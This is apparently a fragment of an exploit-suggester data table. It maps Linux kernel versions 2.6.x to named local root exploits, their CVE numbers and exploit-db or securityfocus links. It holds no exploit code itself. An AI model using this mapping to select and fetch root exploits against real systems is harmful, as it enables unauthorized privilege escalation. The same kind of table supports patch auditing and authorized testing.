array('2.6.13', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'kdump', 'local26', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'py2', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.14', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.15', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'py2', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.16', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.17', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'py2', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
array('2.6.18', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
array('2.6.19', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
array('2.6.2', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.20', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
array('2.6.21', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
array('2.6.22', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
array('2.6.23', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092', 'vmsplice2', 'diane_lane' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5093'),
array('2.6.24', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092', 'vmsplice2', 'diane_lane' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5093'),
array('2.6.25', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.26', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sctp', 'CVE-2008-4113' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.27', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.28', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.29', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
array('2.6.3', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
